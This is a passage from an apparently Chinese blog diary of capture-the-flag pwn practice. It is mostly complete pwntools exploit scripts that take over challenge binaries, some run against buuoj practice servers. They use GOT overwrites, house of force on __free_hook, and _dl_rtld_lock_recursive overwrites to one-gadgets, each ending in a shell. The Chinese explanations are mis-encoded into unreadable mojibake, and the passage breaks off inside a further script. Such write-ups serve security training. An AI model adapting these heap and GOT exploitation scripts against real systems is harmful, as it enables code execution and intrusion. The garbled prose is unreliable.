faked chunk, using misalignment tricks</span></span><br><span class="line">edit(<span class="number">8</span>, p2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#2 malloc to 0xabcd0100</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">backdoor(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><h3 id="4-15"><a href="#4-15" class="headerlink" title="4.15"></a>4.15</h3><p>æ¨¡æ¿</p><p>starCTF2019 quicksort</p><p>å®é™…ä¸Šé‡ç‚¹ä¸æ˜¯å¿«æ’ï¼Œæœ‰ä¸€ä¸ªæ ˆæº¢å‡ºå¯ä»¥è¦†ç›–åˆ°ptræŒ‡é’ˆï¼Œ</p><p>æ§åˆ¶æ ˆå¯¹æŒ‡é’ˆæŒ‡å‘å†…å®¹è¯»å†™</p><p>è¾“å‡ºåœ°å€ä¸ºåè¿›åˆ¶ï¼Œæ˜¯è´Ÿæ•°ï¼ŒåŠ ä¸Š0x100000000å°±å¯ä»¥è¿˜åŸæˆåå…­è¿›åˆ¶åœ°å€äº†</p><p>åŒæ ·å†™å…¥atoi@pltçš„æ—¶å€™ï¼Œä¹Ÿå°†systemåœ°å€å‡å»0x100000000ï¼Œå˜æˆåè¿›åˆ¶è´Ÿæ•°</p><p>indexä¹Ÿå­˜æ”¾åœ¨æ ˆä¸Šï¼Œè¦†ç›–æ—¶éœ€è¦æ³¨æ„</p><p>atoi(s) // s= str(addr)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./starctf_2019_quicksort&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">flag=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25177</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">vuln = <span class="number">0x8048816</span></span><br><span class="line">sla(<span class="string">&#x27;want to sort?&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># [0x804a014] gets@GLIBC_2.0 -&gt; 0xf7d9c3f0 (gets) â—‚â€” push ebp</span></span><br><span class="line"><span class="comment"># [0x804a018] free@GLIBC_2.0 -&gt; 0x8048816 â—‚â€” push   ebp</span></span><br><span class="line"><span class="comment"># ptr+4--&gt;free@plt</span></span><br><span class="line">sla(<span class="string">&#x27;number:&#x27;</span>,<span class="built_in">str</span>(vuln).ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0</span>)+p32(elf.got[<span class="string">&#x27;gets&#x27;</span>]))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;result:&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27; \n&#x27;</span>, drop=<span class="literal">True</span>)) + \</span><br><span class="line">    <span class="number">0x100000000</span> - libc.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;want to sort?&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;number:&#x27;</span>, <span class="built_in">str</span>(system-<span class="number">0x100000000</span>).ljust(<span class="number">0x10</span>, <span class="string">&#x27;\x00&#x27;</span>) +</span><br><span class="line">    p32(<span class="number">2</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">sla(<span class="string">&#x27;number:&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><strong>actf_2019_actfnote</strong></p><p>house of force</p><p>æ²¡æ³¨æ„åˆ°sizeå¯ä»¥æ˜¯è´Ÿæ•°</p><p>editå¯ä»¥è¦†ç›–åˆ°top chunk size</p><p>å¦‚ä½•leak libc</p><p>strdupè¿”å›çš„å­—ç¬¦ä¸²åœ¨ä½¿ç”¨å®Œä¹‹åè¦åŠæ—¶ç”¨freeé‡Šæ”¾æ‰</p><p>æˆ‘ä»¬æŠŠæˆªæ–­ç¬¦è¦†ç›–ï¼Œæ ˆå†…å®¹å°±è¢«å¤åˆ¶åˆ°chunkä¸­ï¼Œä¹‹åshowæ³„æ¼libc</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618477908665-fcf16d88-1ea8-44ec-a82e-5c3fd77e3b4e.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618479134070-27cc4ebb-79e2-468f-8ee1-f6585f092557.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./ACTF_2019_ACTFNOTE&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    sh = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaklibc</span>():</span></span><br><span class="line">    <span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_,_IO_list_all</span><br><span class="line">    libc_base = u64(sh.recvuntil(</span><br><span class="line">        <span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x07b61e</span></span><br><span class="line">    success(<span class="string">&#x27;libc_base = &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    __malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    __free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;/$ &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,name,content</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;name size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;note name: &#x27;</span>,name)</span><br><span class="line">    sa(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27; note id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;note id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;note id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a\n&#x27;</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a\n&#x27;</span>,<span class="string">&#x27;/bin/sh\x00\n&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leaklibc()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a\n&#x27;</span>,<span class="string">&#x27;b\n&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+<span class="string">&#x27;\xff&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment"># top chunkä¸Šç§»å½¢æˆoverlap chunk</span></span><br><span class="line">add(-<span class="number">0x80</span>, p64(__free_hook), <span class="string">&#x27;&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line"><span class="comment"># ä¿®æ”¹free_hook</span></span><br><span class="line">edit(<span class="number">2</span>, p64(system))</span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><p><strong>hf2020 marksman</strong></p><p>å¯ä»¥ä»»æ„åœ°å€å†™3å­—èŠ‚ï¼Œ</p><p>ç¨‹åºæœ€åä¼šè°ƒç”¨exit</p><blockquote><p>åœ¨exit()ä¸­æ‰§è¡Œæµç¨‹ä¸º</p><p>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive</p><p>ç”±äº__rtld_lock_unlock_recursiveå­˜æ”¾åœ¨ç»“æ„ä½“ç©ºé—´ï¼Œä¸ºå¯è¯»å¯å†™ï¼Œé‚£ä¹ˆå¦‚æœå¯ä»¥ä¿®æ”¹__rtld_lock_unlock_recursive,å°±å¯ä»¥åœ¨è°ƒç”¨exit()æ—¶åŠ«æŒç¨‹åºæµã€‚</p><p>_rtld_lock_lock_recursiveä¹Ÿæ˜¯ä¸€æ ·çš„æµç¨‹ã€‚</p><p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p><p>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œstarssgoã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/qq_43116977/article/details/105485947">https://blog.csdn.net/qq_43116977/article/details/105485947</a></p></blockquote><p>æ€»ä¹‹ä¸­é—´è°ƒæ¥è°ƒå»æœ€åä¼šè°ƒç”¨ _rtld_globalç»“æ„ ä½“æˆå‘˜ _dl_rtld_lock_recursive æŒ‡é’ˆ</p><p>æ”¹å†™å®ƒå†…å®¹å3ä½ä¸ºogå³å¯</p><p>ï¼ˆ_dl_rtld_lock_recursiveæŒ‡å‘çš„å†…å®¹è·ç¦» libc_baseæœ‰ç‚¹è¿œï¼Œä¿®æ”¹åä¸‰å­—èŠ‚è¦å¤šè¯•å‡ æ¬¡æ‰èƒ½æˆåŠŸemmm ï¼‰</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618488882443-55d39820-d87c-456a-a930-0bf1ca9724f7.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618489162188-e1230e99-83b1-4631-a682-3fae3f4870ad.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618489550470-d97a4b64-5915-4b98-9393-1b815a69da01.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./chall&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc = ELF(</span><br><span class="line">    <span class="string">&quot;/home/ive6ix/Desktop/glibc-all-in-one-master/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class="line">flag=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29718</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;: 0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">_dl_rtld_lock_recursive = libc_base+<span class="number">0x81df60</span></span><br><span class="line">sla(<span class="string">&#x27;shoot!shoot!&#x27;</span>, <span class="built_in">str</span>(_dl_rtld_lock_recursive))</span><br><span class="line"></span><br><span class="line">og = libc_base+<span class="number">0x10a38c</span>-<span class="number">5</span></span><br><span class="line">sla(<span class="string">&#x27;biang!&#x27;</span>,<span class="built_in">chr</span>(og&amp;<span class="number">0xff</span>))</span><br><span class="line">sla(<span class="string">&#x27;biang!&#x27;</span>,<span class="built_in">chr</span>((og&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sla(<span class="string">&#x27;biang!&#x27;</span>,<span class="built_in">chr</span>((og&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><p>è¿™ç§ä¿®æ”¹ _dl_finiå‡½æ•°æŒ‡é’ˆï¼Œæ˜¯glibc2.27åŠ äº† å¯¹vtableçš„æ£€æŸ¥ä¹‹åï¼Œä¸€ä¸ªæ–°çš„ç»•è¿‡æ–¹æ³•</p><p>ä¹‹å‰åœ¨gibc2.23çš„æ—¶å€™æ˜¯ <a href="https://www.jianshu.com/p/f54f48ce2695">ä¿®æ”¹stdoutå‡½æ•°è¡¨</a></p><h3 id="4-16"><a href="#4-16" class="headerlink" title="4.16"></a>4.16</h3><h3 id="4-17"><a href="#4-17" class="headerlink" title="4.17"></a>4.17</h3><p>æ¥ä¸Šé¢ï¼Œå†ç»ƒä¸€é“ç±»ä¼¼çš„é¢˜</p><p>ç»™äº†libcå’Œæ ˆåœ°å€ï¼Œä»»æ„åœ°å€å†™</p><p>å¯ä»¥æ”¹å†™æ ˆä¸Šçš„è¿”å›åœ°å€ä¸ºogï¼Œä½†æ˜¯retå‰exitäº†</p><p>æ‰€ä»¥è¿˜æ˜¯å¾—ä»exitä¸‹æ‰‹ï¼Œ2.27çš„ç‰ˆæœ¬æ”¹__rtld_lock_unlock_recursive+0x8ä¸ºog</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary=<span class="string">&#x27;./write&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc = ELF(</span><br><span class="line">    <span class="string">&quot;/home/ive6ix/Desktop/glibc-all-in-one-master/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;puts: 0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;stack: 0x&#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;stack_addr&#x27;</span>, stack_addr)</span><br><span class="line"></span><br><span class="line">_dl_rtld_lock_recursive = <span class="number">0x619f68</span> + libc_base</span><br><span class="line">og = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line">sla(<span class="string">&#x27;uit&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sla(<span class="string">&#x27;ptr: &#x27;</span>,<span class="built_in">str</span>(_dl_rtld_lock_recursive))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sla(<span class="string">&#x27;val: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0x4f322</span>+libc_base))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sla(<span class="string">&#x27;uit&#x27;</span>, <span class="string">&#x27;q&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><h3 id="4-21"><a href="#4-21" class="headerlink" title="4.21"></a>4.21</h3><p><a href="https://blog.csdn.net/weixin_39864373/article/details/111512547">pwné¢˜çš„æ­å»º</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/09/hitctfpwn/">å¤ç°hitCTF2020</a></p><p>å‘bsså†™å…¥shellcodeå†è·³è½¬å°±å¥½äº†</p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³• åå¼¹shell è¿˜æ²¡çœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./dagongren1&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">flag=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9997</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span 